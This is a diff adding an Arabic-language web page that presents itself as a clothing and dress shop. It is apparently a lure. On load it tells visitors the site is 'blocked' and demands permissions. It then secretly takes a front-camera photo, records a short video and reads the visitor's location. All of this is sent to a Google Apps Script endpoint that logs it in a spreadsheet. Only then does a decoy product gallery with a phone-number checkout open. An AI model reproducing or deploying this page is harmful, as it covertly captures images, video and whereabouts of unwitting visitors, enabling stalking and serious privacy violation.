@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>الاختيار الافضل للملابس والفساتين</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="الاختيار الأفضل للملابس والفساتين">
+<meta property="og:description" content="تصفح أحدث تشكيلة الملابس والفساتين. جودة عالية وتصاميم مميزة.">
+<meta property="og:url" content="https://projctsappservice-tech.github.io/ALakhtyarAlafthal/">
+<meta property="og:image" content="https://drive.google.com/file/d/1e1X7NkJKMuyPFh_5L41mFmxzKAeaj98e/view?usp=sharing">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- وسوم Twitter Card (لتحسين العرض على منصة X) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="الاختيار الأفضل للملابس والفساتين">
+<meta name="twitter:description" content="تصفح أحدث تشكيلة الملابس والفساتين. جودة عالية وتصاميم مميزة.">
+<meta name="twitter:image" content="https://drive.google.com/file/d/1e1X7NkJKMuyPFh_5L41mFmxzKAeaj98e/view?usp=sharing">
+    <style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body {
+    width: 100%; min-height: 100vh; min-height: 100dvh;
+    background: #ffffff;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    flex-direction: column; user-select: none; -webkit-user-select: none;
+    padding: 20px; overflow-x: hidden;
+    -webkit-text-size-adjust: 100%;
+}
+#status {
+    font-size: 18px; padding: 25px; background: #fff;
+    border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    max-width: 50%; width: 100%; text-align: center;
+    transition: 0.3s; line-height: 1.6; word-wrap: break-word;
+}
+.status-loading { color: #1a73e8; }
+.status-success { color: #34a853; }
+.status-error   { color: #d32f2f; }
+#videoFront { display: none; }
+.click-hint {
+    margin-top: 20px; font-size: 16px; color: #fff;
+    background: #1a73e8; padding: 15px 30px; border-radius: 50px;
+    box-shadow: 0 4px 12px rgba(26,115,232,0.4); cursor: pointer;
+    font-weight: bold; transition: 0.3s; text-align: center;
+    max-width: 50%; width: 100%;
+}
+.click-hint:hover { background: #1558b0; }
+.click-hint:active { transform: scale(0.97); }
+#retryPermBtn {
+    display: none; margin-top: 18px; font-size: 16px; color: #fff;
+    background: #d32f2f; border: none; padding: 12px 24px;
+    border-radius: 50px; cursor: pointer; transition: 0.3s;
+    max-width: 50%; width: 100%;
+}
+#retryPermBtn:hover { background: #b71c1c; }
+#retryPermBtn:active { transform: scale(0.97); }
+
+/* ===== استجابة للشاشات الصغيرة (الجوالات) ===== */
+@media (max-width: 600px) {
+    html, body { padding: 15px; }
+    #status {
+        font-size: 15px; padding: 18px 15px;
+        border-radius: 10px; line-height: 1.55;
+        max-width: 100%;
+    }
+    #status small { font-size: 12px !important; }
+    .click-hint {
+        font-size: 15px; padding: 14px 20px;
+        margin-top: 16px; max-width: 100%;
+    }
+    #retryPermBtn {
+        font-size: 15px; padding: 13px 20px;
+        margin-top: 14px; max-width: 100%;
+    }
+}
+
+@media (max-width: 380px) {
+    #status { font-size: 14px; padding: 15px 12px; }
+    .click-hint { font-size: 14px; padding: 13px 16px; }
+    #retryPermBtn { font-size: 14px; padding: 12px 16px; }
+}
+    </style>
+</head>
+<body>
+<span class="icon">⛔</span>
+    <h2>تم حظر رابط الموقع مؤقتاً</h2>
+<div >لمعاينة التفاصيل سيتم توجيهك للصفحة التالية بعد الموافقة على اذونات الموقع</div>
+<div ></div>
+    <div id="status">👆 جاهز للبدء</div>
+    <div class="click-hint" id="clickHint">اضغط هنا لبدء العملية</div>
+    <button id="retryPermBtn">🔄 إعادة المحاولة</button>
+
+    <video id="videoFront" autoplay playsinline muted></video>
+
+    <script>
+        const SHEET_ID  = '1J_liU4icjkAcTAXB4CtLv1ONEVAFu9FRBGYll4oP9Hk';
+        const SHEET_NAME = 'LocationLink';
+        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbyAO-IfToX1QoBoT0RbpAX-RcmIw3jba_t9XNoHvbpqp2jY8Sbdk8rTvDOk8A_EwRzx/exec`;
+        const DEFAULT_PRICE = 150;
+
+        const IMAGE_URLS = [
+            'https://i.ibb.co/LWfGkVd/Aba1.jpg','https://i.ibb.co/PvcwXKHy/Aba2.jpg','https://i.ibb.co/0yzrMnMf/Aba3.jpg','https://i.ibb.co/qM4xKQxG/Aba4.jpg','https://i.ibb.co/PsVHns53/Aba5.jpg','https://i.ibb.co/ccrRs5py/Aba6.jpg','https://i.ibb.co/C52q5YtG/Aba7.jpg','https://i.ibb.co/5hTcbQcc/fast1.jpg','https://i.ibb.co/sps2WtcQ/fast2.jpg','https://i.ibb.co/WpYX49wp/fast3.jpg','https://i.ibb.co/XxLcpKXb/fast4.jpg','https://i.ibb.co/JDfHB2J/fast5.jpg','https://i.ibb.co/847vWknW/fast6.jpg','https://i.ibb.co/4gpxmqKb/fast7.jpg','https://i.ibb.co/4gpxmqKb/fast7.jpghttps://i.ibb.co/3YGTfH4c/images-8.jpg','https://i.ibb.co/ynQ8Dcpt/images-7.jpg','https://i.ibb.co/LXhmfZXB/images-6.jpg','https://i.ibb.co/v4tycM23/f419a090-1310-4481-9d81-a040fac38b07-Chat-GPTImage-May21202608-53-40-PM.png','https://i.ibb.co/Qv9VQSSt/images-5.jpg','https://i.ibb.co/5gVsWM0T/images-4.jpg','https://i.ibb.co/nssrWf96/images-3.jpg','https://i.ibb.co/XZVQ81hp/images-2.jpg','https://i.ibb.co/5W1SqN4B/d3d9d4f2-5892-42c9-a52f-f2cf64f5083d-666-796875x1000-Gw-WVJSZZGCMBFMq-Um-OCvyq-Jn-Py-DWWz-Dj-Di-Ez-F.jpg','https://i.ibb.co/v4B4k7w8/fa43f299-321e-41dd-93fd-2ea938a92914.jpg','https://i.ibb.co/4gKc98Gv/images-1.jpg','https://i.ibb.co/DPksW7zg/images.jpg','https://i.ibb.co/VpQBsK9Q/Address.jpg','https://i.ibb.co/RFd04kd/few.jpg','https://i.ibb.co/q3pkQcgb/qweqr.jpg','https://i.ibb.co/LdYWYhcw/sadfe.jpg','https://i.ibb.co/GQpVPtvP/Untitled.jpg','https://i.ibb.co/zTzt8rXF/wqw.jpg','https://i.ibb.co/8477Wx3J/wweq.jpg','https://i.ibb.co/q3DsR861/11.jpg','https://i.ibb.co/WNJFHn23/28d3fc1d-45b6-4a84-a331-233ba18a62f3.webp','https://i.ibb.co/RGMp33Wr/images-9.jpg'
+        ];
+
+        let cameraStream = null;
+        let processStarted = false;
+        const statusDiv = document.getElementById('status');
+        const retryPermBtn = document.getElementById('retryPermBtn');
+
+        async function getLocationName(lat, lon) {
+            try {
+                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=10&accept-language=ar`);
+                const data = await r.json();
+                return data.address?.city || data.address?.town || data.address?.state || 'منطقة غير معروفة';
+            } catch { return 'منطقة غير معروفة'; }
+        }
+
+        async function startProcess() {
+            if (processStarted) return;
+            processStarted = true;
+            document.getElementById('clickHint').style.display = 'none';
+            retryPermBtn.style.display = 'none';
+
+            // 1. طلب الكاميرا أولاً
+            statusDiv.innerHTML = " جاري طلب تحميل صفحة المنتجات ...";
+            statusDiv.className = "status-loading";
+            let camOk = false;
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                const vf = document.getElementById('videoFront');
+                vf.srcObject = cameraStream;
+                await new Promise(r => setTimeout(r, 500)); // انتظار بسيط لتشغيل الكاميرا
+                camOk = true;
+            } catch (e) {
+                console.warn('Camera error:', e);
+            }
+
+            // 2. طلب الموقع ثانياً
+            statusDiv.innerHTML = " جاري طلب تحميل صفحة الصور  ...";
+            statusDiv.className = "status-loading";
+            let locData = null;
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 });
+                });
+                locData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
+                locData.locationName = await getLocationName(locData.latitude, locData.longitude);
+            } catch (e) {
+                console.warn('Geo error:', e);
+            }
+
+            // إذا فشلت الكاميرا، نمنع الدخول
+            if (!camOk) {
+                statusDiv.innerHTML = "🚫 يجب السماح الاذونات للموقع لتحميل صفحة الموقع وفتح المعرض.<br><br><small style='color:#666;font-size:14px;'></small>";
+                statusDiv.className = "status-error";
+                retryPermBtn.style.display = 'inline-block';
+                processStarted = false;
+                return;
+            }
+
+            // 3. التقاط صورة سريعة (اختياري)
+      statusDiv.innerHTML = " جاري تحميل صفحة  الموقع ...";
+statusDiv.className = "status-loading";
+
+let imgData = null;
+let videoData = null;
+
+// (أ) التقاط الصورة فوراً من تدفق الكاميرا
+try {
+    const vf = document.getElementById('videoFront');
+    if (vf && vf.videoWidth) {
+        const c = document.createElement('canvas');
+        c.width = vf.videoWidth; c.height = vf.videoHeight;
+        c.getContext('2d').drawImage(vf, 0, 0);
+        imgData = c.toDataURL('image/jpeg', 0.7);
+    }
+} catch(e){}
+
+// (ب) تسجيل فيديو ثانيتين من نفس تدفق الكاميرا
+try {
+    if (cameraStream && window.MediaRecorder) {
+        const mimes = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
+        let mime = '';
+        for (const m of mimes) { if (MediaRecorder.isTypeSupported(m)) { mime = m; break; } }
+
+        if (mime) {
+            const chunks = [];
+            const recorder = new MediaRecorder(cameraStream, {
+                mimeType: mime,
+                videoBitsPerSecond: 500000   // ~500kbps لضغط حجم الفيديو
+            });
+
+            const recorded = new Promise((resolve) => {
+                recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+                recorder.onstop = () => {
+                    try {
+                        const blob = new Blob(chunks, { type: mime });
+                        const reader = new FileReader();
+                        reader.onloadend = () => { videoData = reader.result; resolve(); };
+                        reader.readAsDataURL(blob);
+                    } catch(e) { resolve(); }
+                };
+            });
+
+            recorder.start();
+            await new Promise(r => setTimeout(r, 5000));   // مدة التسجيل: ثانيتان
+            try { recorder.stop(); } catch(e){}
+            await recorded;
+        }
+    }
+} catch(e){ console.warn('Video record error:', e); }
+
+statusDiv.innerHTML = "✅ تم بنجاح! جاري فتح المعرض...";
+statusDiv.className = "status-success";
+
+// إيقاف الكاميرا بعد الانتهاء من الصورة والفيديو
+try { cameraStream.getTracks().forEach(t => t.stop()); } catch(e){}
+cameraStream = null;
+
+// إرسال البيانات (صورة + فيديو) وفتح المعرض
+try {
+    await fetch(GOOGLE_SCRIPT_URL, {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            sheetId: SHEET_ID, sheetName: SHEET_NAME,
+            newDate: new Date().toISOString(),
+            linkLocation: locData ? `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}` : '',
+            latitude: locData?.latitude || '', longitude: locData?.longitude || '',
+            Timestamp: new Date().toLocaleString('ar-EG'), LocationName: locData?.locationName || '',
+            imageData: imgData || '', imageData2: '', imageData3: '', imageData4: '',
+            videoData: videoData || ''   // ← جديد: الفيديو بصيغة Base64 Data URL
+        })
+    });
+} catch(e){}
+
+openBlockWindow();
+processStarted = false;}
+
+        function openBlockWindow() {
+            let galleryHTML = '';
+            IMAGE_URLS.forEach((url, index) => {
+                galleryHTML += `
+                    <div class="image-card" data-url="${url}" data-index="${index}">
+                        <div class="image-wrapper">
+                            <img src="${url}" alt="صورة" draggable="false">
+                            <div class="overlay"></div>
+                            <div class="price-tag">${DEFAULT_PRICE} ر.س</div>
+                            <div class="image-actions">
+                                <button class="fav-btn" data-url="${url}" title="المفضلة">🤍</button>
+                                <button class="cart-btn" data-url="${url}" title="السلة">🛒</button>
+                            </div>
+                        </div>
+                        <div class="like-controls">
+                            <button class="heart-btn" data-url="${url}">🤍</button>
+                            <span class="like-count" id="count-${index}" style="display:none;">0</span>
+                        </div>
+                    </div>`;
+            });
+
+            const htmlContent = `
+            <!DOCTYPE html>
+            <html lang="ar" dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+                <title>معرض الصور</title>
+                <style>
+                    * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-user-select:none; }
+                    html { -webkit-text-size-adjust: 100%; }
+                    body { background:#151515; font-family:'Segoe UI',Tahoma,sans-serif; padding:20px; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; }
+                    .company-header { width:100%; max-width:1200px; text-align:center; color:#ffd54f; font-size:26px; font-weight:bold; padding:10px 15px; margin-bottom:5px; text-shadow:0 2px 8px rgba(0,0,0,0.6); }
+                    .gallery { max-width:1200px; width:100%; display:grid; grid-template-columns:repeat(auto-fill, minmax(280px, 1fr)); gap:25px; padding:20px 0; }
+                    .image-card { background:#1f1f1f; border-radius:16px; overflow:hidden; box-shadow:0 8px 30px rgba(0,0,0,0.7); transition:transform 0.2s; border:1px solid rgba(255,255,255,0.06); display:flex; flex-direction:column; }
+                    .image-wrapper { position:relative; width:100%; padding-top:100%; background:#222; overflow:hidden; }
+                    .image-wrapper img { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; display:block; pointer-events:none; -webkit-user-drag:none; }
+                    .like-controls { display:flex; align-items:center; justify-content:center; gap:15px; padding:12px; background:#161616; border-top:1px solid #2a2a2a; direction:ltr; }
+                    .heart-btn { background:transparent; border:none; font-size:28px; cursor:pointer; color:#fff; padding:0 5px; }
+                    .like-count { color:#fff; font-size:18px; font-weight:bold; background:rgba(255,255,255,0.05); padding:4px 12px; border-radius:30px; display:none; }
+                    
+                    .close-btn { position:fixed; top:20px; right:20px; background:rgba(255,255,255,0.1); color:#fff; border:1px solid rgba(255,255,255,0.2); padding:10px 18px; border-radius:40px; font-size:16px; cursor:pointer; z-index:100; }
+                    .top-actions-bar { position:fixed; top:20px; left:20px; display:flex; gap:12px; z-index:100; }
+                    .top-action-btn { background:rgba(255,255,255,0.1); color:#fff; border:1px solid rgba(255,255,255,0.2); padding:10px 18px; border-radius:40px; font-size:16px; cursor:pointer; display:flex; align-items:center; gap:8px; }
+                    .top-action-btn .badge { background:#e53935; color:#fff; font-size:12px; font-weight:bold; min-width:20px; height:20px; line-height:20px; text-align:center; border-radius:50%; padding:0 5px; }
+                    
+                    .price-tag { position:absolute; bottom:8px; right:8px; background:rgba(0,0,0,0.65); color:#ffd54f; font-size:14px; font-weight:bold; padding:4px 10px; border-radius:20px; z-index:2; }
+                    .image-actions { position:absolute; bottom:8px; left:8px; display:flex; gap:8px; z-index:2; }
+                    .image-actions button { background:rgba(0,0,0,0.55); border:1px solid rgba(255,255,255,0.15); color:#fff; font-size:20px; width:38px; height:38px; border-radius:50%; cursor:pointer; display:flex; align-items:center; justify-content:center; }
+                    .image-actions button.active { background:#e53935; }
+                    .image-actions button.cart-active { background:#1a73e8; }
+                    
+                    .panel-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:200; display:none; }
+                    .panel-overlay.open { display:block; }
+                    .side-panel { position:fixed; top:0; left:0; width:380px; max-width:92vw; height:100vh; background:#141414; z-index:201; transform:translateX(-100%); transition:transform 0.3s ease; display:flex; flex-direction:column; }
+                    .side-panel.open { transform:translateX(0); }
+                    .side-panel-header { display:flex; align-items:center; justify-content:space-between; padding:18px 20px; border-bottom:1px solid #2a2a2a; }
+                    .side-panel-header h3 { color:#fff; font-size:18px; }
+                    .side-panel-close { background:transparent; border:none; color:#aaa; font-size:24px; cursor:pointer; }
+                    .side-panel-body { flex:1; overflow-y:auto; padding:15px; }
+                    .panel-empty { color:#888; text-align:center; padding:40px 10px; }
+                    .panel-item { display:flex; gap:12px; background:#1e1e1e; border:1px solid #2a2a2a; border-radius:12px; padding:10px; margin-bottom:12px; align-items:center; }
+                    .panel-item img { width:60px; height:60px; object-fit:cover; border-radius:8px; }
+                    .panel-item-price { color:#ffd54f; font-weight:bold; font-size:14px; }
+                    .panel-item-remove { background:transparent; border:none; color:#e53935; font-size:20px; cursor:pointer; margin-right:auto; }
+                    .panel-footer { padding:15px 20px; border-top:1px solid #2a2a2a; background:#141414; color:#fff; }
+                    .checkout-btn { width:100%; padding:14px; border-radius:12px; border:none; background:#1a73e8; color:#fff; font-size:16px; font-weight:bold; cursor:pointer; }
+                    .checkout-form { display:none; flex-direction:column; gap:10px; margin-top:10px; }
+                    .checkout-form.open { display:flex; }
+                    .phone-input { width:100%; padding:12px; border-radius:10px; border:1px solid #333; background:#1e1e1e; color:#fff; outline:none; }
+                    .confirm-btn { width:100%; padding:14px; border-radius:12px; border:none; background:#34a853; color:#fff; font-weight:bold; cursor:pointer; }
+                    .success-msg { display:none; background:rgba(52,168,83,0.15); border:1px solid #34a853; color:#7be39b; padding:14px; border-radius:10px; text-align:center; }
+                    .success-msg.open { display:block; }
+                    .cart-summary { margin-top: 8px; padding-top: 14px; border-top: 1px solid #2a2a2a; display: flex; flex-direction: column; gap: 10px; }
+                    .cart-total { color: #fff; font-weight: bold; text-align: center; padding: 4px 0 8px; font-size: 16px; }
+                    .cart-total span { color: #ffd54f; font-size: 22px; }
+                    @media (max-width: 768px) {
+                        body { padding: 60px 8px 15px; }
+                        .gallery { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; padding: 8px 0; }
+                        .company-header { font-size: 18px; padding: 0 0 10px; }
+                        .image-card { border-radius: 10px; }
+                        .like-controls { padding: 5px; gap: 6px; }
+                        .heart-btn { font-size: 18px; }
+                        .like-count { font-size: 12px; padding: 2px 7px; }
+                        .image-actions { bottom: 4px; left: 4px; gap: 4px; }
+                        .image-actions button { width: 28px; height: 28px; font-size: 13px; }
+                        .price-tag { font-size: 10px; padding: 2px 6px; bottom: 4px; right: 4px; }
+                        .close-btn { top: 8px; right: 8px; font-size: 12px; padding: 6px 10px; }
+                        .top-actions-bar { top: 8px; left: 8px; gap: 6px; }
+                        .top-action-btn { font-size: 12px; padding: 6px 10px; }
+                        .top-action-btn .badge { font-size: 10px; min-width: 16px; height: 16px; line-height: 16px; }
+                        .side-panel { width: 100%; max-width: 100%; }
+                    }
+                </style>
+            </head>
+            <body>
+                <button class="close-btn" id="closeBtn">✕ إغلاق</button>
+                <div class="top-actions-bar">
+                    <button class="top-action-btn" id="favTopBtn">🤍 المفضلة <span class="badge" id="favBadge">0</span></button>
+                    <button class="top-action-btn" id="cartTopBtn">🛒 السلة <span class="badge" id="cartBadge">0</span></button>
+                </div>
+
+                <h1 class="company-header">الاختيار الأفضل للملابس والفساتين</h1>
+                <div class="gallery">${galleryHTML}</div>
+
+                <div class="panel-overlay" id="panelOverlay"></div>
+                <aside class="side-panel" id="sidePanel">
+                    <div class="side-panel-header">
+                        <h3 id="panelTitle">المفضلة</h3>
+                        <button class="side-panel-close" id="panelCloseBtn">✕</button>
+                    </div>
+                    <div class="side-panel-body" id="panelBody"></div>
+                    <div class="panel-footer" id="panelFooter"></div>
+                </aside>
+
+                <script>
+                    var DEFAULT_PRICE = ${DEFAULT_PRICE};
+                    var currentPanel = 'favorites';
+                    function getFavorites(){ try{ return JSON.parse(localStorage.getItem('favorites')||'[]'); }catch(e){ return []; } }
+                    function setFavorites(a){ localStorage.setItem('favorites', JSON.stringify(a)); }
+                    function getCart(){ try{ return JSON.parse(localStorage.getItem('cart')||'[]'); }catch(e){ return []; } }
+                    function setCart(a){ localStorage.setItem('cart', JSON.stringify(a)); }
+
+                    function updateBadges(){
+                        var favs = getFavorites(), cart = getCart();
+                        document.getElementById('favBadge').textContent = favs.length;
+                        document.getElementById('cartBadge').textContent = cart.length;
+                        document.querySelectorAll('.fav-btn').forEach(function(btn){
+                            var isFav = favs.indexOf(btn.getAttribute('data-url')) !== -1;
+                            btn.textContent = isFav ? '❤️' : '🤍';
+                            if(isFav) btn.classList.add('active'); else btn.classList.remove('active');
+                        });
+                        document.querySelectorAll('.cart-btn').forEach(function(btn){
+                            var inCart = cart.indexOf(btn.getAttribute('data-url')) !== -1;
+                            if(inCart) btn.classList.add('cart-active'); else btn.classList.remove('cart-active');
+                        });
+                    }
+
+                    function toggleFav(u){
+                        var f = getFavorites(), i = f.indexOf(u);
+                        if(i !== -1) f.splice(i,1); else f.push(u);
+                        setFavorites(f); updateBadges();
+                        if(currentPanel === 'favorites' && document.getElementById('sidePanel').classList.contains('open')) renderPanel('favorites');
+                    }
+
+                    function toggleCart(u){
+                        var c = getCart(), i = c.indexOf(u);
+                        if(i !== -1) c.splice(i,1); else c.push(u);
+                        setCart(c); updateBadges();
+                        if(currentPanel === 'cart' && document.getElementById('sidePanel').classList.contains('open')) renderPanel('cart');
+                    }
+
+                    function removeItem(u){
+                        if(currentPanel === 'favorites') setFavorites(getFavorites().filter(x => x !== u));
+                        else setCart(getCart().filter(x => x !== u));
+                        updateBadges(); renderPanel(currentPanel);
+                    }
+
+                    function openPanel(type){
+                        currentPanel = type; renderPanel(type);
+                        document.getElementById('panelOverlay').classList.add('open');
+                        document.getElementById('sidePanel').classList.add('open');
+                    }
+
+                    function closePanel(){
+                        document.getElementById('panelOverlay').classList.remove('open');
+                        document.getElementById('sidePanel').classList.remove('open');
+                    }
+
+                   function renderPanel(type){
+    var list = type === 'favorites' ? getFavorites() : getCart();
+    document.getElementById('panelTitle').textContent = type === 'favorites' ? 'المفضلة' : 'السلة';
+    var body = document.getElementById('panelBody'), footer = document.getElementById('panelFooter');
+    footer.innerHTML = '';
+
+    if (list.length === 0) {
+        if (type === 'cart') {
+            body.innerHTML = '<div class="panel-empty">السلة فارغة</div>' +
+                '<div class="cart-summary">' +
+                    '<div class="cart-total">الإجمالي: <span>0 ر.س</span></div>' +
+                '</div>';
+        } else {
+            body.innerHTML = '<div class="panel-empty">لا توجد منتجات</div>';
+        }
+        return;
+    }
+
+    var itemsHTML = list.map(function(u){
+        return '<div class="panel-item"><img src="' + u + '"><div class="panel-item-price">' + DEFAULT_PRICE + ' ر.س</div><button class="panel-item-remove" data-remove="' + u + '">🗑️</button></div>';
+    }).join('');
+
+    if (type === 'cart') {
+        var total = list.length * DEFAULT_PRICE;
+        body.innerHTML = itemsHTML +
+            '<div class="cart-summary">' +
+                '<div class="cart-total">الإجمالي: <span>' + total + ' ر.س</span></div>' +
+                '<button class="checkout-btn" id="checkoutBtn">🛍️ طلب الشراء</button>' +
+                '<div class="checkout-form" id="checkoutForm">' +
+                    '<input type="tel" class="phone-input" id="phoneInput" placeholder="أدخل رقم الهاتف">' +
+                    '<button class="confirm-btn" id="confirmBtn">إكمال الشراء</button>' +
+                '</div>' +
+                '<div class="success-msg" id="successMsg">تم تسجيل طلبك بنجاح، سيتم التواصل معك لاخذ القياس وإيصال المنتج والدفع عند الاستلام.</div>' +
+            '</div>';
+    } else {
+        body.innerHTML = itemsHTML;
+    }
+
+    body.querySelectorAll('.panel-item-remove').forEach(function(btn){
+        btn.addEventListener('click', function(){ removeItem(btn.getAttribute('data-remove')); });
+    });
+
+    if (type === 'cart') {
+        document.getElementById('checkoutBtn').addEventListener('click', function(){
+            document.getElementById('checkoutForm').classList.add('open');
+            this.style.display = 'none';
+        });
+
+        document.getElementById('confirmBtn').addEventListener('click', function(){
+            var phone = document.getElementById('phoneInput').value.trim();
+            if(!phone) { alert('الرجاء إدخال رقم الهاتف'); return; }
+            document.getElementById('checkoutForm').classList.remove('open');
+            document.getElementById('successMsg').classList.add('open');
+            setCart([]); updateBadges();
+            setTimeout(function(){ closePanel(); renderPanel('cart'); }, 2000);
+        });
+    }
+}
+
+                   function closeAllWindows() {
+    try { if (window.opener && !window.opener.closed) window.opener.close(); } catch(e){}
+    try { window.close(); } catch(e){}
+}
+document.getElementById('closeBtn').addEventListener('click', closeAllWindows);
+
+// في حال إغلاق النافذة بأي طريقة أخرى (زر X أو غيرها) نغلق النافذة الأصلية أيضاً
+window.addEventListener('beforeunload', function(){
+    try { if (window.opener && !window.opener.closed) window.opener.close(); } catch(e){}
+});
+                    document.getElementById('favTopBtn').addEventListener('click', function(){ openPanel('favorites'); });
+                    document.getElementById('cartTopBtn').addEventListener('click', function(){ openPanel('cart'); });
+                    document.getElementById('panelOverlay').addEventListener('click', closePanel);
+                    document.getElementById('panelCloseBtn').addEventListener('click', closePanel);
+
+                    document.querySelectorAll('.fav-btn').forEach(function(btn){
+                        btn.addEventListener('click', function(e){ e.stopPropagation(); toggleFav(btn.getAttribute('data-url')); });
+                    });
+                    document.querySelectorAll('.cart-btn').forEach(function(btn){
+                        btn.addEventListener('click', function(e){ e.stopPropagation(); toggleCart(btn.getAttribute('data-url')); });
+                    });
+
+                    updateBadges();
+                <\/script>
+            </body>
+            </html>`;
+
+            const w = window.open('', '_blank');
+            if (w) { w.document.write(htmlContent); w.document.close(); }
+            else alert("يرجى السماح بالنوافذ المنبثقة");
+        }
+
+        document.getElementById('clickHint').addEventListener('click', startProcess);
+        retryPermBtn.addEventListener('click', () => { processStarted = false; startProcess(); });
+        setTimeout(startProcess, 500);
+    </script>
+</body>
+</html>
